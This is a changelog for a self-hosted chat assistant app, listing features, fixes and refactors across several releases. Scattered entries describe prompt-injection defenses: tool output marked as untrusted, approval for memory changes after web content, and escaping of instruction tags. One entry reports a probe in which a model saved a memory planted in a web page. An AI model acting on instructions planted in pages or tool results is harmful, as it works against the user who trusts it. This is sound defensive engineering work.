- Code only: the projects feature lives in `src/server/projects/` (store, search index, chunking, instruction writer, routes, its two tools and its schema SQL, with an `index.ts` for the rest of the server and tests under `tests/server/projects/`). `database.ts` still runs the migrations in one fixed order, now taking the projects SQL from `projects/schema.ts`; a fresh database has the identical schema and `user_version` as before.
- Code only: `ChatService` (480 lines, from 654) keeps the turn loop; the request fallbacks (optional features, attachments, listing models) are `ModelRequests` (`model-requests.ts`) and chat titles are `TitleWriter` (`title-writer.ts`), both injected, so the routes for titles, models and tools use them directly (`ToolRegistry.info` lists the tools). Behavior is unchanged.
- Code only: each route file (`routes/*.ts`) declares the few collaborators it uses instead of taking the whole `AppDeps` from `app.ts`, which removes the six import cycles between `app.ts` and the routes; `app.ts` still composes them from `AppDeps`.

## [0.12.2] - 2026-11-02

### Changed

- Docs: [TURN.md](TURN.md) follows a message from Send to the answer on screen (request, door, turn loop, one request to the model, tools and approval, events, the browser), with where to look to change each part; AGENTS.md links it.
- Dependencies updated: `hono` 4.13.16, `openai` 7.47.0, `react-router` 8.5.1, `lucide-react` 1.66.0, `linkedom` 0.18.15, `@types/node` 26.6.6, and `unpdf` 2.1.0 (a major release: the PDF fixtures, page markers and retrieval tests pass unchanged). pnpm 12.16.1 is the minimum (`devEngines`; an older pnpm downloads it).
- `rehype-katex` and `remark-math` ran KaTeX 0.16, which has a low-severity advisory (GHSA-238p-pmpm-9mq7), beside the 0.19 whose stylesheet we load. `pnpm-workspace.yaml` now pins one version (0.19), and `pnpm audit --prod` is clean.
- The web app's main script is 366 kB, down from 965 kB (gzip 115 kB, from 297 kB), and the build no longer warns about large chunks: the Markdown renderer (with code highlighting) is a separate chunk that loads beside the app, and KaTeX another that loads the first time a message has math. Until the renderer arrives a message shows as plain text.
- `search_chats` counts as untrusted (old chats hold whatever was pasted or fetched in them), so a memory change in a chat that searched its past chats asks for approval first, and such chats get the "others' text is not instructions" rule.
- Code only: the tags in the instructions (`<user_profile>`, `<response_style>`, `<project>`, `<memories>`) go through one `section()` that writes a closing tag inside the text as `&lt;/tag`, so a memory or an instruction can't end its section and pass for instructions.

## [0.12.1] - 2026-11-02

### Added

- A search hit in a PDF carries the page it starts on (`page`, stored per chunk), and **Sources** opens the PDF at that page ("report.pdf · p. 12"). PDFs are chunked again once, at startup, to record pages.
- A file whose text is longer than 5,000,000 characters says so in the project's file list ("Only the first 5,000,000 of … characters are searchable"); the list now shows a file's note in place of "Keywords only".

- **Add folder** on a project's Files card (and dropping a folder on it) adds a whole folder: files keep their folder path as their name (`app/src/main.ts`), and files projects can't read, folders such as `node_modules`, `.git`, `dist` and `build`, and everything past 1,000 files are skipped, with a count shown.

- Code only: `tests/server/retrieval.test.ts` measures how often a project search puts the answering passage first (90% now) and among the first three (100%), over a small corpus (`tests/fixtures/retrieval`: handbook, TypeScript, meeting notes, recipes, a PDF with pages) and filler documents; it fails below 80% and 95%. Run it before and after changing chunking or ranking (`pnpm exec vitest run tests/server/retrieval.test.ts` prints the numbers and the misses).

### Fixed

- Two files with the same name in a project (differing content) were told apart by nothing: `read_project_file` and the `file` filter took the first. The second is now named `notes (2).md`, and so on.
- A file read with `read_project_file` now appears under **Sources** (the result carries `file_id`), as search hits do.

## [0.12.0] - 2026-11-02

### Added

- `read_project_file`: in project chats the model can read a project file in order, about 10,000 characters at a time, for questions about the whole of a file (summaries, comparisons) or the text around a search hit. Before, it only had the 6 best passages.
- `search_project_files` takes an optional `file` to search one file, and each hit says its part (`part` of `parts`) so the model can read around it. Longer PDFs get `[Page n]` lines (when indexed), so answers can cite pages.
- Projects: **Add note** writes text straight into a project file (Markdown), and a file that failed or is searchable by keywords only has an **Index again** button (`POST /api/projects/:id/files/:fileId/index`).
- A file with the same content as one already in the project is refused (409, naming the file it matches) and its upload deleted, so search stops returning every hit twice.
- More text files are accepted in projects and as attachments: those named without an extension (`Dockerfile`, `Makefile`, `README`, `LICENSE`, …) and more extensions (`.jsonl`, `.mdx`, `.graphql`, `.gradle`, `.tf`, `.srt`, dotfiles such as `.gitignore`, and other languages). `.env` stays out, as it holds secrets. The file picker filters by extension, so extensionless files go in by drag and drop.
- `search_project_files` takes a `limit` (1 to 15, default 6), so the model asks for more passages on a broad question and fewer on a narrow one.
- Smarter chunking for project files (`chunking.ts`): markdown splits at headings (a new `#`/`##` section starts a new chunk, chunks cut inside a section are prefixed with the headings above them, fenced code stays whole), source code splits at top-level units (functions and classes stay together, a comment or decorator stays with what it describes), and long text is cut at blank lines, line breaks or sentence ends (`Intl.Segmenter`) before words, with the overlap starting at such a seam too. On this repo's own files, chunks starting at a seam went from 13–25% to 30–67% for TypeScript and from 57–67% to 78–86% for README/AGENTS. Files chunked by an older chunker are indexed again at startup (each file records `CHUNKER_VERSION`; raise it whenever chunking changes), which embeds them again when an embedding endpoint is set.
- Text and code files are read with their indentation (it was collapsed to one space), for search and as attachments.
- Projects have a short `description` (up to 200 characters, in `PATCH /api/projects/:id`) that tells them apart in lists.
- The project page shows the instructions first, as a three-line preview with Edit (or a prompt to add some), and a **Suggest from files** button in the editor that drafts them from the files for review. A project's description shows under its name, in the sidebar's tooltip and in "Move to project"; **Edit name and description** in the project's **…** menu changes both.
- `POST /api/projects/:id/suggest-instructions` drafts a project's instructions from its name, description, current instructions and the start of each indexed file, with the chat model (`InstructionWriter`); nothing is saved, the user reviews the draft. It answers 409 until a file is indexed.
- In a project chat, `search_chats` searches that project's chats only.

## [0.11.13] - 2026-10-30

### Changed

- Code only: full-text search moved out of `ConversationStore` into `ConversationSearch` (`conversations()` for the sidebar, `messages()` for `search_chats`), on the same database; `AppDeps` and `ToolDeps` take a `search`, and the store no longer goes to the tools. Behavior is unchanged.
- Code only: the composer's "+" menu (`AddMenu`, which also owns the `ToolOption` type), attachments row (`DraftAttachments`), queued-message row (`QueuedMessage`) and draft storage (`composerDrafts.ts`) are their own files, and `useChat`'s queued message is a `useQueue` hook. The markup is unchanged (the layout e2e specs pass untouched).

## [0.11.12] - 2026-10-30

### Changed

- Code only (tests): the e2e `resetSettings` restores the server's own defaults and the settings test no longer lists every setting, so a new setting needs no change in either; the fake model's tool triggers are a `TRIGGERS` table (one row per tool) instead of an if-chain, checked against the old behavior on 100 phrases.
- Code only: the turn route's checks (files can be attached here, an approval has calls waiting, `parentId` is a place a message can follow) are `refuseTurn` in `turn-request.ts`, with a test for each refusal; the route keeps the same statuses and messages.

## [0.11.11] - 2026-10-30

### Changed

- Code only: `ChatService`'s 207-line turn loop is split into named steps (`#startTurn`, `#planTurn`, `#runCalls`, `#respond`, `#titleIfNew`) around a small `TurnPlan`; behavior is unchanged (the existing tests pass untouched).
- Code only: each tool describes itself (`group`, `summary`, `running` / `done`, `chip`, and `unavailable()` when it needs setup), and `GET /api/tools` sends it. The web app's per-tool tables (`tools.ts`, the tool-call labels, the composer's tool list) are gone, so a new tool needs one server file. `web_search` and the image tools are always registered, listed in Settings with what's missing when unconfigured, and never offered to the model; the Settings Tools tab now sorts a section's tools by label.
- AGENTS.md's "Adding a tool" lists the presentation fields, and no longer names a flag that doesn't exist (`inTemporaryChats`; it is `offeredIn`).
- Docs only: README, PLAN, DESIGN and AGENTS are synced with the code (status, the Settings tabs, the tokens file, `scripts/`, `pnpm release`, the logo spacing). PLAN gains a status table with each phase's release and a record of the patch releases between phases, marks Phases 11a and 11 as not built, and drops finished phases' commit lists, "Done when" notes and research narration.

## [0.11.10] - 2026-10-28

### Changed

- The composer groups its buttons: the + button and a chosen tool's chip on the left, the mode, mic and send buttons on the right, all on the bottom row of the box as it grows.
- The gap between the logo and the wordmark in the sidebar is 4 px (was 6).
- Roadmap: Phase 11a, multiple providers, is planned (proposed, not yet agreed) before the code runner, which moves to v0.13.0. The plan's decision rows still describe the single provider that ships today.
- Dependencies updated: `openai` 7.45 (a new model identifier; no breaking changes) and `lucide-react` 1.62.
- A 429 from the model server says whether you have reached the provider's usage limit (with what to do: pick another model, or add credits) or the server is only limiting requests for now (with its retry time), instead of showing the raw error. Other errors are unchanged.
- Code only: the default OpenAI model (`gpt-6-astra`, used when `OPENAI_MODEL` isn't set) is typed with the SDK's own `ChatModel`, so an SDK that drops or renames it fails the typecheck. The SDK has no default model at runtime, so chibot still sends the name.
- The chat instructions say to typeset formulas and equations in `$…$` / `$$…$$` but write plain numbers and simple arithmetic as ordinary text. On `gpt-5.4-mini`, "17 times 23" came back as `$17 \times 23 = 391$`; it now answers "391", and formulas stay math. Checked live: 6 of 6 derivation answers used `$` delimiters, against `\[ … \]` in 2 of 2 with the previous wording.

### Fixed

- On a phone, the message box no longer wraps onto a row of its own once its text is wider than the free space, which left the + button alone above it. The box shares the row with the buttons and wraps its text inside. A chosen tool's chip (Search the web, Create an image) and the + button now take a row above the box on a phone, where the chip used to squeeze the message box to a few pixels.

## [0.11.9] - 2026-10-27

### Changed

- The chat instructions follow OpenAI's and Anthropic's prompting guidance. They are laid out as an identity line, an `<instructions>` list, then named sections (`<user_profile>`, `<response_style>`, `<project>`, the tools' memories and file names, `<current_time>`), with the stable text first and the changing text last. The rules now say why (the chat renders Markdown and only `$…$` math), and add: reply in the user's language, match length to the question, ask one short question only when a wrong guess would cost the user, answer from your own knowledge before using a tool, and say when a tool fails. The user's own sections override the defaults, and the rule about others' text in tool results stays firm.
- The time in the instructions is rounded down to the quarter hour. The exact minute changed the start of every request, so OpenAI's prompt cache could not reuse the conversation history after a minute.

## [0.11.8] - 2026-10-27

### Changed

- Dependencies updated: `openai` 7.39 → 7.44, `hono` 4.13.14, `vite` 8.3.5, `katex` 0.19.1, `eventsource-parser` 4.1.3, `hast-util-to-text` 4.0.3, and the exact-pinned `undici` 8.12.3, `unpdf` 1.9.1 and `linkedom` 0.18.14. The `openai` release notes' breaking changes are in APIs chibot doesn't use (Live decisions).
- Code only: what chibot tells the model moved from `chat-service.ts` to `prompts.ts`, and `TurnView.tsx` lost its tool-call, sources and image parts to `ToolCalls.tsx`, `Sources.tsx`, `AnswerImages.tsx` and `Summary.tsx`.

### Fixed

- A failed or timed-out image request is no longer retried automatically by the SDK (two retries by default), which could have billed an image more than once; the model sees the error and decides whether to ask again.

## [0.11.7] - 2026-10-27

### Changed

- Code only: `app.ts` keeps the access checks and mounts one route file per area (`routes/*.ts`; the same 36 routes), the rule for when a tool call waits for approval is `ToolRegistry.needsApproval` (it was a private method of `ChatService`), and server tests build their `ChatService` with `testChat` (`tests/server/fakes.ts`).

### Fixed

- A message sent right after Stop (a queued one) follows the stopped answer's saved partial text instead of sometimes racing it: the server runs a chat's turns one after another, waiting up to 5 s for the previous one to finish unwinding. Before, the queued message could be answered from the wrong place and the partial answer could end up on a branch of its own.

## [0.11.6] - 2026-10-27

### Added

- `pnpm release patch|minor|major|X.Y.Z` cuts a release: it bumps `package.json`, moves the CHANGELOG's `[Unreleased]` entries under the new version, runs the checks and commits. It needs a clean working tree.

### Changed

- Code only: `styles.css` is split into one file per area (`styles/*.css`; the built stylesheet is identical), and `SettingsDialog.tsx` into one component per tab (`settings/*.tsx`).
- `fetch_url` also reads JSON and XML variants (`application/ld+json`, RSS and Atom feeds, `application/xml`), which it used to refuse.
- A project chat's instructions list at most 50 file names ("and N more"), instead of every file's name on every request.

### Fixed

- `search_chats` dates: a day the month doesn't have (`2026-02-31`) is refused instead of silently meaning 3 March, and a blank date means none (models often send `""` for null) instead of an error.

## [0.11.5] - 2026-10-27

### Added

- Settings → Tools → MCP servers has **Reload**: it re-reads `mcp.json` without restarting chibot (new servers connect, removed ones stop, changed ones restart; a file with mistakes is reported and changes nothing). `.env` is still read at startup only.
- A chat's **…** menu has **Regenerate title**: the model names the chat again, replacing the current title, even one you typed (`POST /api/conversations/:id/title`).

### Fixed

- The "Jump to latest" button no longer appears (and following stops) after an answer whose content grows slightly after it scrolled: only scrolling up leaves the end of the chat, and the view follows the thread's growth.

### Changed

- The project uses pnpm 12.15.0 (`devEngines`, lockfile).

## [0.11.4] - 2026-10-27

### Added

- Settings → Tools → each MCP server has **Ask before using its tools**: its calls then wait for Approve / Deny (the `askMcpServers` setting). Off by default.

### Changed

- Local MCP servers get 60 s to connect (remote ones keep 10 s), so a first `npx` download isn't reported as failed.
## [0.11.3] - 2026-10-27

### Added

- A logo: a forked path whose right arm ends in the accent dot, at 20 px beside the sidebar wordmark and as the browser tab's icon (`favicon.svg`), with a dark tile version for 16 px.
- Send a message while an answer streams: it waits in a **Queued** row and goes once the answer is saved (or as soon as you stop it), and can be edited or cancelled first. Text only: files still need uploading before sending.
- Memories can be edited in Settings → Personalization → Memory, which shows how many of the 100 are used.
- A memory that repeats one already saved (ignoring case and spacing) is reported to the model instead of stored twice; changing one memory to another's text is refused.
- Each answer shows its context against the compaction threshold (`12.4K / 64K context`), red at 80 % of it, with the input/output breakdown in the tooltip.

### Changed

- The memory instructions count the entries and ask the model to merge related memories rather than drop them when the list is close to the 100 limit.
- Memories are stored on one line (runs of whitespace collapsed) and listed to the model as data inside `<memories>`, so a memory can't add lines or instructions to the prompt.
- The per-answer token total is replaced by the context usage; the chat's total across versions stays at the top right.
- The instructions describe chibot as an expert assistant and ask it to answer directly and accurately, saying so when it is unsure.

### Removed

- The calculator tool and its Settings row. Calls saved by older chats show their raw arguments and result.

### Fixed

- The composer's mode chip (Auto / Fast / Thinking) stays on the bottom row with the other buttons when the message grows to several lines, instead of floating to the middle.
- MCP results without `content` (a result with only `structuredContent`, or none) are read instead of failing, and a failed call no longer keeps its images with the chat.
- Pages whose `charset` is quoted or misspelled are read as UTF-8 instead of failing.
- A web search that hangs gives up after 10 s, like `fetch_url`.
- Images whose format chibot doesn't serve (anything but PNG, JPEG and WebP) are kept as PNG, rather than trusting the endpoint's `output_format` as the file's type.
- Stopping an answer now cancels a running project file search's embedding request.
- `fetch_url` also refuses the IPv4 addresses that NAT64 and 6to4 IPv6 addresses can carry, not only IPv4-mapped ones.
- A project file whose status can't be saved no longer leaves the indexing queue permanently rejected (an unhandled rejection that stopped chibot, then no file indexed).

## [0.11.2] - 2026-10-25

### Fixed

- Local MCP servers without a `cwd` start in the home folder instead of chibot's, where `npx` and npm refused to run (`EBADDEVENGINES`, from chibot's `devEngines`).

## [0.11.1] - 2026-10-25

### Changed

- The chat instructions say who chibot is (a private app on the user's machine), and, while web search, page reading or MCP tools are offered, that their output is information, never instructions to follow. Before, only read pages carried that warning.

## [0.11.0] - 2026-10-25

### Added

- MCP servers' config: `mcp.json` (path from `CHIBOT_MCP_CONFIG`, default the chibot folder; `mcp.example.json` shows the format), with `local` and `remote` servers and `${VAR}` filled from the environment. Errors name the server and field.
- MCP connections (`McpServers`): enabled servers connect in parallel at start (a local server runs as a child process with only safe environment defaults plus its own `env`), with a status per server, tool lists that follow the server's changes, a crash or dropped connection marked as failed (with the server's last error output), and calls that Stop cancels. A new setting, `disabledMcpServers`, switches servers off.
- MCP tools: each connected server's tools are offered beside chibot's own as `<server>__<tool>`, with the server's JSON Schema (not strict) and without asking first; their output counts as untrusted. Results pass on the text (or `structuredContent` as JSON), cut at 40k characters; `isError` reaches the model as an error. Images (PNG, JPEG, GIF, WebP) are kept with the chat and shown in the answer, and the model gets a note in their place.
- MCP sign-in: a remote server that answers 401 (and sets no `Authorization` header of its own) can sign in with OAuth (dynamic client registration, PKCE), returning to chibot's own address; chibot checks `state`, which the SDK doesn't. Tokens and registrations are kept in `data/mcp-auth.json`, readable by the owner only.
- Settings → Tools → MCP servers: each server from `mcp.json` with a switch, its status (or error), Reconnect, Sign in / Sign out, and its tools with their own switches. Signing in returns to this tab. Routes: `GET /api/mcp`, `POST /api/mcp/:name/{reconnect,sign-in,sign-out}`, `GET /api/mcp/oauth/callback` (reachable without `CHIBOT_TOKEN`'s cookie; its `state` is checked).
- Answers show MCP calls as "Used read_file · files", with their arguments and text result.

### Changed

- Roadmap: Phase 10 is now the MCP client (servers in `mcp.json` only, calls that never ask, local and remote servers with OAuth sign-in, a switch per server and tool); the code runner moves to Phase 11.

## [0.10.15] - 2026-10-25

### Changed

- The model menu's reasoning effort sub-menu opens when the mouse rests on its row, and closes when it rests elsewhere in the menu; clicking the row no longer closes a sub-menu that hovering opened.

## [0.10.14] - 2026-10-24

### Changed

- An answer's tool calls share one collapsible row, labelled with what they did ("Searched the web, Memory updated"; while one runs, what it's doing), which opens to each call and its own details. A single call shows as before.

## [0.10.13] - 2026-10-24

### Changed

- Reasoning effort levels read "Auto" (the model's default, as in the composer's mode switch) and "None" … "Max", capitalized, in the model menu, the header, Settings and the composer, instead of "Default" / "Model default" and lowercase names.

## [0.10.12] - 2026-10-24

### Changed

- The model menu's reasoning effort is a sub-menu: a "Reasoning effort" row showing the current effort opens the levels beside it (below it on a phone), instead of a row of pills inside the model menu. It works from the keyboard (→ opens, ← and Esc close).

## [0.10.11] - 2026-10-24

### Added

- ↑ in an empty message box opens your last message for editing (as in ChatGPT); the shortcuts list shows it. Only one message is open for editing at a time.
- Unsent message text survives a reload or a closed tab: each chat's draft is kept in this browser (`localStorage`) until it's sent or cleared. Attached files still last only while the page is open.

### Fixed

- Long chats stalled while an answer streamed: every streamed chunk parsed, highlighted and typeset every earlier answer again. Answers now render only when their text changes (a 40-turn chat went from 3 s of a 5 s stream blocking the page to none).

## [0.10.10] - 2026-10-24

### Added

- Screen readers hear when an answer starts, when it's ready, and when a tool waits for approval (a polite live region; errors were already announced).
- On phones, where the sidebar is hidden, the header shows the open chat's title before the model name.
- The browser tab is named after the chat on screen ("Faster SQLite writes – chibot", following renames), or the project on its page, instead of always "chibot", so tabs, history and bookmarks can be told apart.

### Fixed

- An unsent message followed you to whichever chat you opened next, attached files included, which could then be sent to the wrong chat. Each chat now keeps its own draft (text, files and picked tool) while chibot is open.
- On phones and tablets a message couldn't have line breaks: Enter always sent, and touch keyboards have no Shift+Enter. On touch-only devices Enter now adds a line (the keyboard shows return) and the send button sends; the same in the edit box.

## [0.10.9] - 2026-10-24

### Added

- Images (generated or attached) open full size over the chat, with Download and Close, instead of in a new tab, which on a phone meant leaving chibot. ⌘/Ctrl-click still opens a tab.
- Menus (the composer's "+" and mode switch, a chat's and a project's "…") work from the keyboard: they open on their first item, ↑ / ↓ move between items, Home / End jump to the ends, and Esc returns to the button.

### Fixed

- On phones, Settings keeps the selected tab in view in its scrolling tab row, and the sidebar no longer offers Keyboard shortcuts on touch-only devices.
- Opening a chat briefly showed the new-chat page (greeting and centred composer) while its messages loaded; the message area now stays blank until they arrive.
- On touch screens, a chat's "…" menu (rename, pin, archive, move, delete), copy / edit / regenerate on earlier messages and image downloads were invisible, since they waited for a hover. They're always shown there now.

## [0.10.8] - 2026-10-24

### Fixed

- After upgrading chibot, a browser could keep a cached copy of the page that named scripts the new build had deleted, leaving the app blank until a hard reload. The page is now served with `Cache-Control: no-cache` (scripts keep their content-hashed names and normal caching).

## [0.10.7] - 2026-10-24

### Changed

- Opening a tool call shows what it did in plain terms (the search and the pages found, the calculation and its result, the memory change, the page read, the image prompt) instead of raw JSON, which stays under "Raw".
- A project's rename and delete moved into a "…" menu next to its name, like a chat's, instead of an always-visible red delete button.
- The Settings dialog is as tall as the tab shown (a short tab no longer sits in a mostly empty dialog), anchored near the top so switching tabs doesn't make it jump; on phones its tabs sit in a row above the content, which was squeezed to a word per line.
- Settings → Tools groups the tools, says what each does and what leaves this machine, and lists tools that aren't set up (greyed out, with what to set). Web search is called "Search the web" there too, as in the "+" menu.
- Quotes in answers have a rule on the left, instead of the browser's plain 40 px indent.
- Thoughts, tool calls and Sources open with a turning chevron, like the rest of the icons, instead of the browser's default triangle.

## [0.10.6] - 2026-10-23

### Fixed

- An image request answered 404 (a server without an images endpoint, such as Ollama, which removed image generation in 0.32.6) now says so and suggests pointing `OPENAI_IMAGE_BASE_URL` at OpenAI, instead of only asking to check the image model. README no longer suggests Ollama image models.
- Import checks embedded files (no duplicate ids, every attachment present) and replaces only file and image ids, in items, tool output and call arguments, so a UUID inside message text is left alone.
- A new or edited message can't start in the middle of an answer (e.g. under a reasoning item); it may follow a message or a tool output, so editing after a failed or stopped turn still works. Regenerating still needs a user message.
- A rename made while the title was being generated is no longer overwritten.
- A corrupt stored setting falls back to its default instead of breaking settings.
- chibot refuses to open a database from a newer version, with a clear error.
- A missing attachment or an unreadable document gives a clear error instead of crashing.
- Composer: removing a queued upload before it finishes no longer sends an empty message; a send the server refused before saving it puts the draft and attachments back.
- Dictation ignores a second start while the microphone is being opened, and leaving the page cancels a transcription in flight.
- Keyboard shortcuts stay bound while handlers change (e.g. as an answer streams), instead of rebinding on every render.
- Leaving a temporary chat could delete the chat opened next, and a failed load of another chat could leave the previous chat's messages on screen. Navigation now clears stale turns and guards temporary cleanup by the loaded chat id.
- If reloading a chat's history failed after an answer, the answer disappeared from the screen; it now stays, with the error.
- Switching versions quickly could show the answer of a version that was no longer selected, and overlapping list loads could show an older response. Late responses are now ignored.
- Project files indexed before embedding settings existed were never embedded, so their contents weren't searchable. Indexing now resumes with the configured model, and retries failed embeddings on startup.
- Stored tool sources with unsafe URLs (including `javascript:`) could reach link rendering; only `http:` and `https:` sources are now shown.

## [0.10.5] - 2026-10-23

### Added

- A mode switch in the composer: Auto (the model's default), Fast (`low` reasoning effort) or Thinking (`high`), the same setting as the header menu and Settings.
- A "Jump to latest" ↓ button appears above the composer while the chat is scrolled up.

### Changed

- The composer's "+" menu says what "Add photos & files" takes, and lists "Search the web" and "Create an image" even when they can't be used, greyed out with the reason (what to set in `.env`, or "Off in Settings → Tools").

### Fixed

- chibot was unusable on phones: the sidebar kept 260 of 375 px, squeezing the chat to a word per line. Below 768 px the sidebar is now a drawer over a full-width chat (opened from the header, closed by tapping beside it or opening a chat). Dialogs and the drawer share a `--scrim` token.

## [0.10.4] - 2026-10-23

### Added

- The header's model menu sets the reasoning effort too (Default, or `none` to `max`), the same setting as Settings → Model; a chosen effort shows next to the model name.

## [0.10.3] - 2026-10-23

### Changed

- Menus (model picker, the composer's "+", a chat's "…") are placed by CSS anchor positioning, Baseline since Firefox 147, instead of script measuring the button on each click. They follow their button on scroll and resize, flip when there's no room, and stay on screen in short windows.

### Fixed

- Math written with LaTeX's `\(…\)` and `\[…\]` showed as raw text (remark-math only knows `$…$` / `$$…$$`); answers now render it, leaving code as is.

## [0.10.2] - 2026-10-23

### Added

- `CHIBOT_TOKEN`: an optional access token, for using chibot from other devices (`HOST=0.0.0.0`). Open it once per browser with `?token=…`; an HttpOnly, SameSite=Strict cookie remembers it, and requests without it get a 401. The startup warning for an exposed server now suggests it.

### Security

- Web pages could use chibot behind the user's back: any site could post uploads (and, through `/api/transcriptions`, spend the API key), since form posts skip CORS preflight; and a site that points its own name at 127.0.0.1 (DNS rebinding) could read chats and run turns. chibot now answers only to this machine's names and IP addresses (plus `HOST`), and refuses form posts from other origins (Hono's `csrf()`; requests without browser headers, e.g. curl, are unaffected).

## [0.10.1] - 2026-10-23

### Added

- A message can be just attachments, with no text (the turn's `text` may be blank when it has `fileIds`).

### Changed

- Internal simplifications: one shared helper finds a message's attachments (web turns, Markdown export and sending used three); upload routes validate their multipart body with zod like every JSON route (`form()` beside `json()`); JSON export reuses the stored-item mapping; `FileCard` has its own module; `useChat` shows a loaded chat through one helper.
- Sending while attachments upload no longer does nothing: the message goes as soon as they're up (the send button spins meanwhile), unless one is refused.
- Roadmap: Phase 10 planned, a sandboxed Python code runner (`run_python` on Pyodide in a locked-down child process, files in `/mnt/data/` kept with the chat, a fixed package set cached locally, `.xlsx` attachments). The MCP client becomes Phase 11.

### Fixed

- A turn refused after its attachments were checked (e.g. an unknown `parentId`) no longer links them to the chat; they stay unsent uploads and are swept as usual.
- Documents' extracted text (sent to models that refuse files) was cached in memory for good, even after their chat was deleted; the cache now keeps the last 20.

## [0.10.0] - 2026-10-23

### Added

- Sending attachments: turns take `fileIds` (uploads from `POST /api/files`, which now also takes PNG, JPEG, WebP and GIF images), stored as `input_image` / `input_file` parts naming chibot's own file ids. Each request uploads them once to the provider's Files API (30-day expiry; the id is kept in `files.provider_file_id`), sends them inline where there's no Files API (Ollama), and sends documents as their extracted text to models that refuse files; a provider that lost an upload (404) gets it again. An image sent to a model that can't see images says so and suggests one that can. Deleting a chat deletes its provider copies too.
- `POST /api/transcriptions` and `OPENAI_TRANSCRIBE_BASE_URL` / `_API_KEY` / `_MODEL` (default `gpt-transcribe` on OpenAI); `GET /api/health` reports `features.transcription`. Failures name the endpoint and model and what to set.
- Attachments: "Add photos & files" heads the composer's "+" menu (always shown now), and pasting or dropping files onto the chat attaches them too. Chips above the text show a thumbnail or file card, a spinner while uploading, the error if a file is refused, and × to remove; Send waits for uploads. Sent messages show image thumbnails (opening full size) and file cards, and editing a message keeps its attachments.
- Voice input: a mic button in the composer records (`MediaRecorder`, the browser's own format) and inserts the transcript at the cursor, through `POST /api/transcriptions`. Without a transcription model it's greyed out and its tooltip says what to set. `.env.example` and README document `OPENAI_TRANSCRIBE_*`.
- JSON export version 2 embeds the chat's attachments and generated images (base64); import gives them new ids and still accepts version 1. Imports may be up to 200 MB (was 20 MB). Markdown export lists each message's attachments.

### Changed

- Roadmap: Phase 9 revised. Documents go as their extracted text to models that reject files (Ollama), so PDFs and Word files work there; attachments accept images plus the project document types; attaching joins the composer's "+" menu; JSON export also embeds generated images; images and transcription get clear setup errors.
- The model picker lists only chat models: on Ollama by each model's capabilities (`/api/show`, which also catches image models with plain names), elsewhere by leaving out embedding, speech, transcription, image, video, moderation, realtime, Chat-Completions-only search and legacy completion models.

### Fixed

- Image generation that can't work (e.g. `OPENAI_IMAGE_MODEL` set to a chat model, or an endpoint without images) now says which endpoint and model failed and what to set, instead of a bare 404 or "Connection error". README and `.env.example` say the image model must be an image-generation model.

## [0.9.1] - 2026-10-23

### Fixed

- Stored files (project uploads, generated images) are served with `nosniff`, and all but PDFs with `Content-Security-Policy: sandbox`: an uploaded HTML file opened from a project could otherwise run scripts with access to chibot's API.
- Removing a project file (or its project) while it was being indexed left its chunks and vectors behind.
- Renaming or deleting a project showed nothing when it failed.
- 404s name what's missing; projects, files, memories and items all said "Conversation not found".

### Changed

- `GET /api/tools` no longer returns `enabled` (the web reads the `disabledTools` setting); the `Health` type is shared.
- Internal simplifications: ChatService finds waiting tool calls itself; ProjectStore, MemoryStore and FileStore return shared types straight from SQL (aliases, `RETURNING`); the web API client has one request, JSON and delete helper each; lists and dialogs load through one `useLoad` hook; `TurnView` is split out of `ChatPage`; `REASONING_EFFORTS` is checked against the SDK's type.

### Removed

- The unused `highlight.js` dependency (`rehype-highlight` brings its own).

## [0.9.0] - 2026-10-23

### Added

- Projects: chats grouped with their own files and instructions. The sidebar lists projects ("New project"); a project's page has its name (rename, delete), a composer that starts chats in it, its files, instructions and chats. Chats move in with "Move to project…" and out with "Remove from project"; project chats are listed only in their project and show "Project /" in the header. Deleting a project deletes its chats and files.
- Project files: `POST /api/files` takes PDF, Word (`.docx`) and text files (≤ 50 MB); in a project they're indexed in the background (text via `unpdf`, `mammoth` and Readability, overlapping chunks, FTS5, and with `OPENAI_EMBEDDING_*` vectors in `sqlite-vec`), with their status shown. Indexing resumes after a restart and re-embeds when the embedding model changes.
- `search_project_files`: in project chats with files, keyword and vector hits merged by reciprocal rank fusion; the project's instructions and file names go into the chat's instructions, and Sources lists the files used.
- End-to-end tests for answering from project files with project instructions, and for moving chats in and out and deleting a project. The fake server embeds text.

### Changed

- SQLite opens with `sqlite-vec` loaded (extension loading is then switched off).
- Tools decide where they're offered (`offeredIn(conversation)`, replacing `inTemporaryChats`) and get the chat's project in their context.
- The model's searches (`search_chats`, project files) match words under 4 letters only whole, so "do" no longer finds "door".
- Menus low in the window open upward. Route tests build the app with `testApp()`.
- Roadmap: Phase 8 detailed. Project files are searched by keywords always and by meaning when an embedding model is set (`sqlite-vec`, verified in `node:sqlite`); Word files are supported; projects get no model override (one global model); project chats are listed only in their project, and deleting a project deletes them.

## [0.8.0] - 2026-10-23

### Added

- Memory: a `memory` tool saves, updates and deletes what chibot remembers about the user (at most 100 memories of 300 characters, stored in SQLite), and chat instructions list the memories while the tool is offered. Answers say "Memory updated".
- Memory changes ask first in chats whose history holds web content (`requiresApproval: 'after-untrusted'`, with `untrustedOutput` on `web_search` and `fetch_url`), so a page can't plant a memory; a probe showed `gpt-oss` doing exactly that.
- `search_chats`: searches the user's other chats (any word, ranked by relevance, optional date range) and returns each chat's best few messages in order; Sources links the chats found.
- Settings → Personalization → Memory: the memory switch (the memory tool's) and Manage memories, to delete one or all (`GET /api/memories`, `DELETE /api/memories[/:id]`).
- Tools can add to the instructions while offered (`instructions()`) and opt out of temporary chats (`inTemporaryChats`); memory and chat search do.
- End-to-end tests for remembering across chats and deleting from Settings, temporary chats, asking after web content, and finding an earlier chat.

### Changed

- Roadmap: Phase 7 detailed. Memory changes ask first in chats that read web content (a probe showed `gpt-oss` saving a memory planted in a page); the memory tool's switch is the memory switch; `search_chats` matches any word by relevance with an optional date range.

## [0.7.0] - 2026-10-23

### Added

- Web search (`web_search`, Brave Search API with `BRAVE_API_KEY`): top results with snippets; answers cite sources, and a Sources list under the answer links every page searched or read.
- Reading pages (`fetch_url`): main text through Readability (plain text, Markdown and JSON as is), capped and marked as untrusted. It refuses this machine and private networks (including IPv4-mapped IPv6), checked at connect time for every connection and redirect.
- Images (`generate_image`, `edit_image`) through the image endpoint (`OPENAI_IMAGE_BASE_URL` / `_API_KEY` / `_MODEL`, defaulting to the chat endpoint and `gpt-image-2` on OpenAI), at medium quality. Images are stored in `data/files/`, served by `GET /api/files/:id`, shown in the answer (with a placeholder while made, full size and download) and deleted with their chat.
- Settings → Tools switches each tool on or off (`disabledTools`; `GET /api/tools`), and the composer's "+" menu makes the next message search the web or create an image (`tool` in the turn request forces it on the first request).
